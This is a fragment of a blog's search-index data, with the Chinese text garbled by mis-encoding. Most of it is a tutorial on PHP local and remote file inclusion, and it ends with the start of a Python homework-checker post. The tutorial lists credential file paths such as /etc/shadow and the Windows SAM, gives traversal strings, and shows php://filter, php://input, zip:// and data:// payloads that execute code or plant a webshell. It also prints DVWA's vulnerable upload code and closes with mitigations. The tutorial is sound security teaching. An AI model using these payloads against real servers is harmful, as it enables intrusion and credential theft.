20; i++) {\n        printf(\"argv[%d]: %s\\n\", i, argv[i]);\n    }\n\n    return 0;\n}\n```\n\n![image-20230814150202144](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230814150202144.png)\n","tags":["ctf","misc"],"categories":["CTF","NepCTF 2023"]},{"title":"æ–‡ä»¶åŒ…å«","url":"/æ–‡ä»¶åŒ…å«/","content":"\n# æ–‡ä»¶åŒ…å«\n\n## å«ä¹‰\n\næœ¬è´¨æ˜¯è¾“å…¥ä¸€æ®µç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶çš„è„šæœ¬æˆ–è€…ä»£ç ï¼Œå¹¶è®©æœåŠ¡ç«¯æ‰§è¡Œã€‚\n\n1. ä»¥PHPä¸ºä¾‹ï¼Œå¸¸ç”¨çš„æ–‡ä»¶åŒ…å«\n\n`include(),require(),include_once(),require_once()`\n\n2. åŒºåˆ«\n\n- *require():*æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶ä¼šäº§ç”Ÿè‡´å‘½è­¦å‘Šï¼Œå¹¶åœæ­¢è„šæœ¬è¿è¡Œ\n- *include():*æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­è¿è¡Œ\n- *require_once()ä¸require()ç±»ä¼¼:*å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ\n- *include_once()ä¸include()ç±»ä¼¼:*å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ\n\n3. åˆ†æ\n\nä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œæˆ‘ä»¬åˆ©ç”¨`phpstudy`,åœ¨ç½‘ç«™æ ¹ç›®å½•åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼š\n\né¦–å…ˆæ˜¯`include.php`\n\n```php\n<?php\n\tinclude $_GET['test'];\n?>\n```\n\næ¥ç€æ˜¯`phpinfo.php`\n\n```php\n<?php\n\tphpinfo();\n?>\n```\n\næˆåŠŸè§£æ\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808143942662.png\" alt=\"image-20230808143942662\" style=\"zoom:80%;\" />\n\nå°†phpinfo.phpæ–‡ä»¶åç¼€æ”¹ä¸ºtxtåè¿›è¡Œè®¿é—®ï¼Œä¾ç„¶å¯ä»¥è§£æ:\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808144634126.png\" alt=\"image-20230808144634126\" style=\"zoom:80%;\" />\n\nå°†phpinfo.phpæ–‡ä»¶åç¼€æ”¹ä¸ºjpgæ ¼å¼ï¼Œä¹Ÿå¯ä»¥è§£æ:\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808144725186.png\" alt=\"image-20230808144725186\" style=\"zoom:80%;\" />\n\nå¯ä»¥çœ‹å‡ºï¼Œinclude()å‡½æ•°å¹¶ä¸åœ¨æ„è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ï¼Œåªè¦æœ‰phpä»£ç ï¼Œéƒ½ä¼šè¢«è§£æå‡ºæ¥ã€‚\n\nä¸Šä¼ äº†ä¸€jpgæ ¼å¼çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå¦‚æœç½‘ç«™æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œjpgæ–‡ä»¶å°±å¯ä»¥è¢«å½“åšphpæ–‡ä»¶è§£æï¼Œæ‰€ä»¥è¿™å°±æ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´é€šå¸¸é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨ã€‚\n\n## æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)\n\nèƒ½å¤Ÿæ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œæˆ‘ä»¬ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808145244893.png\" alt=\"image-20230808145244893\" style=\"zoom:80%;\" />\n\nåŒæ—¶ä¹Ÿå¯ä»¥åˆ©ç”¨è¯¥ä»£ç ï¼Œè¯»å–ä¸€äº›æœ¬åœ°ç³»ç»Ÿçš„æ•æ„Ÿä¿¡æ¯\n\nä¾‹å¦‚ï¼š`C:\\Windows\\system.ini`\n\n1. ä½¿ç”¨ç»åœ°è·¯å¾„ç›´æ¥è¯»å–:\n\n`localhost/include.php?filename=C:\\Windows\\system.ini`\n\n2. ä½¿ç”¨ç›¸å¯¹è·¯å¾„è¿›è¡Œè¯»å–:\n\nâ€‹\t`./` è¡¨ç¤ºå½“å‰è·¯å¾„\n\nâ€‹\t`../` è¡¨ç¤ºä¸Šä¸€çº§è·¯å¾„ä½ç½®\n\nä¾‹å¦‚å½“å‰é¡µé¢æ‰€åœ¨è·¯å¾„ä¸º`C:\\Apache24\\htdocs\\`ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨../é€€åˆ°Cç›˜å†è¿›è¡Œè®¿é—®ï¼Œæ„é€ è·¯å¾„å¦‚ä¸‹ï¼š\n`../../windows/system.ini`\n\n3. å¸¸è§çš„æ•æ„Ÿç›®å½•ä¿¡æ¯è·¯å¾„:\n\nWindowsç³»ç»Ÿ:\n\n- C:\\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬\n- C:\\windows\\system32\\inetsrv\\MetaBase.xml //IISé…ç½®æ–‡ä»¶\n- C:\\windows\\repair\\sam //å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç \n- C:\\ProgramFiles\\mysql\\my.ini //Mysqlé…ç½®\n- C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL rootå¯†ç \n- C:\\windows\\php.ini //phpé…ç½®ä¿¡æ¯\n\nLinux/Unixç³»ç»Ÿ:\n\n- /etc/password //è´¦æˆ·ä¿¡æ¯\n- /etc/shadow //è´¦æˆ·å¯†ç ä¿¡æ¯\n- /usr/local/app/apache2/conf/httpd.conf //Apache2é»˜è®¤é…ç½®æ–‡ä»¶\n- /usr/local/app/apache2/conf/extra/httpd-vhost.conf //è™šæ‹Ÿç½‘ç«™é…ç½®\n- /usr/local/app/php5/lib/php.ini //PHPç›¸å…³é…ç½®\n- /etc/httpd/conf/httpd.conf //Apacheé…ç½®æ–‡ä»¶\n- /etc/my.conf //mysqlé…ç½®æ–‡ä»¶\n\n### LFIæ¼æ´åˆ©ç”¨æŠ€å·§\n\n1. é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨\n\næœ‰æ—¶å€™æˆ‘ä»¬æ‰¾ä¸åˆ°æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ— æ³•ä¸Šä¼ webshellï¼Œå¯ä»¥å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ ¼å¼çš„webshellåˆ°æœåŠ¡å™¨ï¼Œå†åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œè§£æã€‚\n\nä¾‹é¢˜ï¼š`DVWA File Upload`\n\næºç ï¼š\n\n```php\n<?php\n\nif( isset( $_POST[ 'Upload' ] ) ) {\n    // Where are we going to be writing to?\n    $target_path  = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\";\n    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );\n\n    // Can we move the file to the upload folder?\n    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {\n        // No\n        echo '<pre>Your image was not uploaded.</pre>';\n    }\n    else {\n        // Yes!\n        echo \"<pre>{$target_path} succesfully uploaded!</pre>\";\n    }\n}\n\n?>\n```\n\nç®€å•ä»‹ç»ä¸€ä¸‹è§£é¢˜æ€è·¯ï¼š\n\nå¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨å¯¹ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ã€å†…å®¹æ²¡æœ‰åšä»»ä½•çš„æ£€æŸ¥ã€è¿‡æ»¤ï¼Œå­˜åœ¨æ˜æ˜¾çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œç”Ÿæˆä¸Šä¼ è·¯å¾„åï¼ŒæœåŠ¡å™¨ä¼šæ£€æŸ¥æ˜¯å¦ä¸Šä¼ æˆåŠŸå¹¶è¿”å›ç›¸åº”æç¤ºä¿¡æ¯ã€‚\n\nä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶é€šè¿‡èšå‰‘è¿›è¡Œè¿æ¥çˆ†ç ´ç›®å½•ï¼š\n\n![image-20230808154439463](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808154439463.png)\n\n2. åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶\n\n**åˆ©ç”¨æ¡ä»¶:**\n\n- å¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»\n- çŸ¥é“æ—¥å¿—æ–‡ä»¶å­˜å‚¨ç›®å½•\n\n**æ³¨æ„:**\n\n- ä¸€èˆ¬æƒ…å†µä¸‹æ—¥å¿—å­˜å‚¨ç›®å½•ä¼šè¢«ä¿®æ”¹ï¼Œéœ€è¦è¯»å–æœåŠ¡å™¨é…ç½®æ–‡ä»¶(httpd.conf,nginx,conf,......)æˆ–è€…æ ¹æ®phpinfo()ä¸­çš„ä¿¡æ¯æ¥å¾—çŸ¥\n- æ—¥å¿—è®°å½•çš„ä¿¡æ¯éƒ½å¯ä»¥è¢«è°ƒæ•´ï¼Œæ¯”å¦‚è®°å½•æŠ¥é”™çš„ç­‰çº§ï¼Œæˆ–è€…å†…å®¹æ ¼å¼\n\nåœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥access.logï¼Œå½“å‘ç”Ÿé”™è¯¯æ—¶å°†é”™è¯¯å†™å…¥error.logï¼Œæ—¥å¿—æ–‡ä»¶å¦‚ä¸‹:\n\n![image-20230808153750802](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808153750802.png)\n\næ­£å¸¸è®¿é—®ç½‘é¡µæ—¶ï¼Œaccessæ—¥å¿—ä¼šè¿›è¡Œè®°å½•ï¼Œå¦‚ä¸‹å›¾è®°å½•æ‰€ç¤ºï¼š\n\n![image-20230808153929107](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808153929107.png)\n\n### åŒ…å«sessionæ–‡ä»¶\n\nå¯ä»¥å…ˆæ ¹æ®å°è¯•åŒ…å«åˆ°SESSIONæ–‡ä»¶ï¼Œåœ¨æ ¹æ®æ–‡ä»¶å†…å®¹å¯»æ‰¾å¯æ§å˜é‡ï¼Œåœ¨æ„é€ payloadæ’å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæœ€ååŒ…å«å³å¯ã€‚\n\n**åˆ©ç”¨æ¡ä»¶:**\n\n- æ‰¾åˆ°Sessionå†…çš„å¯æ§å˜é‡\n- Sessionæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„\n\nphpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚\n\n![image-20230808155049759](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808155049759.png)\n\n**sessionå¸¸è§å­˜å‚¨è·¯å¾„:**\n\n- /var/lib/php/sess_PHPSESSID\n- /var/lib/php/sess_PHPSESSID\n- /tmp/sess_PHPSESSID\n- /tmp/sessions/sess_PHPSESSID\n- sessionæ–‡ä»¶æ ¼å¼:sess_[phpsessid],è€Œphpsessidåœ¨å‘é€çš„è¯·æ±‚çš„cookieå­—æ®µä¸­å¯ä»¥çœ‹åˆ°ã€‚\n\n### åŒ…å«ä¸´æ—¶æ–‡ä»¶\n\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/e6618d373f0c467cb1a7fc6cb4b0046b.png)\nphpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨C:\\windows\\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤å‰ï¼Œå¯ä»¥åˆ©ç”¨æ—¶é—´ç«äº‰çš„æ–¹å¼åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚\n\nç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„æ˜¯éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowsä¸‹åªæœ‰65535ç§ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚\n\nå¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚\n\n## è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)\n\nå¦‚æœPHPçš„é…ç½®é€‰é¡¹`allow_url_include`ã€`allow_url_fopen`çŠ¶æ€ä¸ºONçš„è¯ï¼Œåˆ™**include/require**å‡½æ•°æ˜¯å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶çš„ï¼Œè¿™ç§æ¼æ´è¢«ç§°ä¸ºè¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)\n\n![image-20230808155617492](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808155617492.png)\n\né¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€æ®µä»£ç `include.php`\n\n```php\n<?php\n\t$path=$_GET['path'];\n\tinclude($path . '/phpinfo.php');\n?>\n```\n\n`127.0.0.1/include.php/path=site`è®¿é—®æœ¬åœ°siteç›®å½•ä¸‹çš„phpinfo.phpæ–‡ä»¶:\n\nè¯¥é¡µé¢å¹¶æ²¡æœ‰å¯¹$pathåšä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚\n\næˆ‘ä»¬åœ¨è¿œç«¯WebæœåŠ¡å™¨/site/ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªtest.phpæ–‡ä»¶ï¼Œå†…å®¹ä¸ºphpinfo()ï¼Œåˆ©ç”¨æ¼æ´å»è¯»å–è¿™ä¸ªæ–‡ä»¶ã€‚\n\nä½†æ˜¯ä»£ç ä¼šç»™æˆ‘ä»¬è¾“å…¥çš„è·¯å¾„åé¢åŠ ä¸Šâ€™/phpinfo.phpâ€™åç¼€ï¼Œå¦‚æœphpç‰ˆæœ¬å°äº5.3.4ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨%00æˆªæ–­ï¼Œè¿™é‡Œphpç‰ˆæœ¬ä¸º7.3.4ï¼Œä¸é€‚ç”¨ã€‚\n\nè¿˜æœ‰ä¸€ç§æˆªæ–­æ–¹æ³•å°±æ˜¯?å·æˆªæ–­ï¼Œåœ¨è·¯å¾„åé¢è¾“å…¥?å·ï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸º?å·åé¢çš„å†…å®¹ä¸ºGETæ–¹æ³•ä¼ é€’çš„å‚æ•°ï¼ŒæˆåŠŸè¯»å–test.phpå¦‚ä¸‹ï¼š\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/5f410573f9664f12bff64166719a0592.png)\n\nå¦‚æœtest.phpæ˜¯æ¶æ„çš„webshellæ–‡ä»¶ï¼Œé‚£ä¹ˆåˆ©ç”¨è¯¥æ¼æ´å°±å¯ä»¥è·å–åˆ°æœåŠ¡å™¨æƒé™ã€‚\n\n## PHPä¼ªåè®®\n\nPHPå†…ç½®äº†å¾ˆå¤šURLé£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼fopen()ã€copy()ã€file_exists()å’Œfilesize()çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°\n\nå¦‚ä¸‹æ‰€ç¤º\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/30b963c25bea48dcbc496cffb05d9989.png)\n\n### 1.file://åè®®\n\n**file://** ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/b36518ada13d4840adda715be02c8c57.png)\nfile:// [æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/c7155542f0104f3588a3b809f5e30dbc.png)\n\n### 2.php://åè®®\n\nphp:// è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯`php://filter`å’Œ`php://input`\n**php://filterç”¨äºè¯»å–æºç **ã€‚\n**php://inputç”¨äºæ‰§è¡Œphpä»£ç **ã€‚\n\n**php://filter** è¯»å–æºä»£ç å¹¶è¿›è¡Œbase64ç¼–ç è¾“å‡ºï¼Œä¸ç„¶ä¼šç›´æ¥å½“åšphpä»£ç æ‰§è¡Œå°±çœ‹ä¸åˆ°æºä»£ç å†…å®¹äº†ã€‚\n**åˆ©ç”¨æ¡ä»¶:**\n\n- allow_url_fopen ï¼šoff/on\n- allow_url_includeï¼šoff/on\n\nä¾‹å¦‚æœ‰ä¸€äº›æ•æ„Ÿä¿¡æ¯ä¼šä¿å­˜åœ¨phpæ–‡ä»¶ä¸­ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥åˆ©ç”¨æ–‡ä»¶åŒ…å«å»æ‰“å¼€ä¸€ä¸ªphpæ–‡ä»¶ï¼Œphpä»£ç æ˜¯ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„ï¼Œä¾‹å¦‚æ‰“å¼€å½“å‰ç›®å½•ä¸‹çš„2.php:\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/82059d24101a403b9f3b8e7769e4cf9f.png)\nä»–åªæ˜¾ç¤ºäº†ä¸€æ¡è¯­å¥ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä»¥base64ç¼–ç çš„æ–¹å¼è¯»å–æŒ‡å®šæ–‡ä»¶çš„æºç :\n\nè¾“å…¥\n`php://filter/convert.base64-encode/resource=æ–‡ä»¶è·¯å¾„`\nå¾—åˆ°2.phpåŠ å¯†åçš„æºç ï¼š\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/b667bf338aab4e82bcf72ad77472b3f0.png)\nå†è¿›è¡Œbase64è§£ç ï¼Œè·å–åˆ°2.phpçš„å®Œæ•´æºç ä¿¡æ¯ï¼š\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/65f354f2a2774be9b74c3f3940b8e0b3.png)\n**php://input** å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚\n**åˆ©ç”¨æ¡ä»¶:**\n\n- allow_url_fopen ï¼šoff/on\n- allow_url_includeï¼šon\n\nåˆ©ç”¨è¯¥æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™å…¥phpæ–‡ä»¶ï¼Œè¾“å…¥`file=php://input`ï¼Œç„¶åä½¿ç”¨burpæŠ“åŒ…ï¼Œå†™å…¥phpä»£ç ï¼š\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/b8cdd2c6e9a94365b64c58ef3f5c48ee.png)\nå‘é€æŠ¥æ–‡ï¼Œå¯ä»¥çœ‹åˆ°æœ¬åœ°ç”Ÿæˆäº†ä¸€å¥è¯æœ¨é©¬ï¼š\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/c99b110b71cc4854a2cfc3821b6befe3.png)\n\n### 3.ZIP://åè®®\n\n**zip://** å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\n- zip://ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚\n- è¦ç”¨#åˆ†å‰²å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç æˆ%23(å³ä¸‹è¿°POCä¸­#è¦ç”¨%23æ›¿æ¢ï¼‰\n- åªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚\n- ç›¸åŒçš„ç±»å‹è¿˜æœ‰zlib://å’Œbzip2://\n\n**åˆ©ç”¨æ¡ä»¶:**\n\n- allow_url_fopen ï¼šoff/on\n- allow_url_includeï¼šoff/on\n\nPOCä¸ºï¼š\n\n```java\nzip://[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]?file=zip://D:\\1.zip%23phpinfo.txt\n```\n\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/7f04b0e59fda44cdb669d99fa315410b.png)\n\n### 4.data://åè®®\n\n**data://** åŒæ ·ç±»ä¼¼ä¸php://inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\nåˆ©ç”¨data:// ä¼ªåè®®å¯ä»¥ç›´æ¥è¾¾åˆ°æ‰§è¡Œphpä»£ç çš„æ•ˆæœï¼Œä¾‹å¦‚æ‰§è¡Œphpinfo()å‡½æ•°ï¼š\n**åˆ©ç”¨æ¡ä»¶:**\n\n- allow_url_fopen ï¼šon\n- allow_url_includeï¼šon\n\nPOCä¸º:\n\n```java\ndata://text/plain,<?php phpinfo();?>\n//å¦‚æœæ­¤å¤„å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡base64ç¼–ç åå†è¾“å…¥ï¼š\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n```\n\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/fdf0d4eb7b9f4b40b4e22b6990162cb8.png)\n\n### 5.ä¼ªåè®®åˆ©ç”¨æ¡ä»¶\n\nä¼ªåè®®çš„åˆ©ç”¨æ–¹æ³•è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚\nä¼ªåè®®çš„ç”¨æ³•å°ç»“\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/4737e3fbbbae4ebda4d419264e9e556c.png)\n\n## æ–‡ä»¶åŒ…å«æ¼æ´é˜²æŠ¤\n\n1ã€ä½¿ç”¨**str_replace**ç­‰æ–¹æ³•è¿‡æ»¤æ‰å±é™©å­—ç¬¦\n\n2ã€é…ç½®open_basedirï¼Œé˜²æ­¢ç›®å½•éå†ï¼ˆ**open_basedir å°†phpæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­**ï¼‰\n\n3ã€phpç‰ˆæœ¬å‡çº§ï¼Œé˜²æ­¢%00æˆªæ–­\n\n4ã€å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œé˜²æ­¢è¢«è¯»å–\n\n5ã€å¯¹äºåŠ¨æ€åŒ…å«çš„æ–‡ä»¶å¯ä»¥è®¾ç½®ä¸€ä¸ªç™½åå•ï¼Œä¸è¯»å–éç™½åå•çš„æ–‡ä»¶ã€‚\n\n6ã€åšå¥½ç®¡ç†å‘˜æƒé™åˆ’åˆ†ï¼Œåšå¥½æ–‡ä»¶çš„æƒé™ç®¡ç†ï¼Œ**allow_url_includeå’Œallow_url_fopen**æœ€å°æƒé™åŒ–\n"},{"title":"Python Homework Checker","url":"/Python-Homework-Checker/","content":"\n# Python Homework Checker(æ ¹æ®Excelåå•å¯¹ç…§æ–‡ä»¶å¤¹ä¸­å­¦ç”Ÿä½œä¸šè¿›è¡Œæ£€æŸ¥æ˜¯å¦æäº¤ä½œä¸š) \n\nâ€‹          ç°åœ¨ä¸€èˆ¬çš„ä½œä¸šéƒ½æ˜¯ç½‘ä¸Šæäº¤æ–‡ä»¶ä¸ºä¸»ï¼Œæˆ‘ä»¬æ€»ä¼šæœ‰ä¸€äº›ä½œä¸ºæ”¶ä½œä¸šçš„äººä¼šçƒ¦æ¼è°è¿˜æ²¡äº¤ä½œä¸šï¼Œæ‰€ä»¥æˆ‘å°±è¿™ä¸ªé—®é¢˜å†™äº†ä¸€æ®µå°ä»£ç æ¥æ£€æµ‹å“ªä¸ªäººæ²¡äº¤ä½œä¸šã€‚ \n\nâ€‹           åŸç†æ˜¯è¯»å…¥ä½œä¸šæ‰€åœ¨çš„æ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶åç§°ï¼Œå°†è¿™äº›æ–‡ä»¶åç§°å’Œä½ è¦æ”¶é›†çš„åå•å¯¹æ¯”ï¼Œå°†æ²¡æœ‰çš„åå•è¾“å‡º ä»¥ä¸‹æ˜¯ä¸€ä¸ªç”¨Pythonæ£€æŸ¥å­¦ç”Ÿæ˜¯å¦æäº¤ä½œä¸šçš„ç¨‹åºï¼Œå®ƒå¯ä»¥æ£€æŸ¥ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­æ˜¯å¦å­˜åœ¨æŒ‰å­¦ç”Ÿå­¦å·å‘½åçš„PDFæ–‡ä»¶ï¼Œä»¥ç¡®å®šå“ªäº›å­¦ç”Ÿå·²ç»æäº¤ä½œä¸šã€‚æœ¬ç¨‹åºä½¿ç”¨`openpyxl`å’Œ`os`åº“ï¼Œå› æ­¤éœ€è¦ç¡®ä¿å®‰è£…äº†è¿™ä¸¤ä¸ªåº“ã€‚ \n\nâ€‹          å¦‚æœExcelæ–‡ä»¶ä¸­æœ‰å¤šåˆ—ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åˆ—æ 